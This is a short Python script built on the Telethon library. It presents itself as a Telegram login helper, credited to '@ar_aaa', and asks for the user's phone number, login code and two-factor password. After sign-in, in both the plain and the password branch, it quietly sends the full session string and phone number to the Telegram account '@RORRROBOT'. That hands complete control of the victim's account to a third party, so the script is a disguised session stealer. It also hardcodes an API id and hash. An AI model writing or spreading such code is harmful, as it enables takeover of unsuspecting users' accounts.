from telethon import TelegramClient, sync
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import os
import pickle

api_id = 829746
api_hash = "98483e947d2d31c28605e52d368b445f"

os.system("clear")
print("""\033[031m

Developer: @ar_aaa

""")

try:
    with open('my_session.pkl', 'rb') as f:
        string = pickle.load(f)
    client = TelegramClient(StringSession(string), api_id, api_hash)

except FileNotFoundError:
    string = input("Press enter: ")
    client = TelegramClient(StringSession(string), api_id, api_hash)

finally: # 
    phone_number = input("\033[032mPlease enter your phone (or bot token): ")
    client.connect()

    if not client.is_user_authorized():
        client.send_code_request(phone_number)
        try:
            me = client.sign_in(phone_number, input('\033[032mPlease enter the code you received: '))
            
            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{phone_number}`') 

            with open('my_session.pkl', 'wb') as f:
                pickle.dump(client.session.save(), f)

        except SessionPasswordNeededError:
            password = input('\033[032mPlease enter your password: ')
            me2 = client.sign_in(password=password)
            
            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{phone_number}`') 

            with open('my_session.pkl', 'wb') as f:
                pickle.dump(client.session.save(), f)
